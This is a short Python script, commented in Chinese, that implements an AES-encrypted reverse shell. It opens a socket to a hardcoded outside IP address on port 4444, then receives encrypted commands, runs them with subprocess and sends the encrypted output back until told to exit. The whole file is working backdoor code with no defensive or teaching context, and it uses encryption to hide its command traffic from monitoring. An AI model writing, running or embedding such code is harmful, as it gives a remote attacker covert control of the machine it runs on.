#!/usr/bin/env python3
"""
加密反弹shell - AES加密通信
"""
import socket
import subprocess
import os
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
import base64

KEY = b'16bytesecretkey!'  # 16字节密钥

def encrypt(data):
    cipher = AES.new(KEY, AES.MODE_ECB)
    return cipher.encrypt(pad(data.encode(), 16))

def decrypt(data):
    cipher = AES.new(KEY, AES.MODE_ECB)
    return unpad(cipher.decrypt(data), 16).decode()

def reverse_shell(host, port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))
    
    while True:
        try:
            # 接收加密命令
            cmd_enc = s.recv(4096)
            cmd = decrypt(cmd_enc)
            
            if cmd.lower() == 'exit':
                break
            
            # 执行命令
            result = subprocess.getoutput(cmd)
            
            # 加密并发送结果
            s.send(encrypt(result))
            
        except Exception as e:
            s.send(encrypt(f"Error: {e}"))
    
    s.close()

if __name__ == "__main__":
    reverse_shell("94.74.110.167", 4444)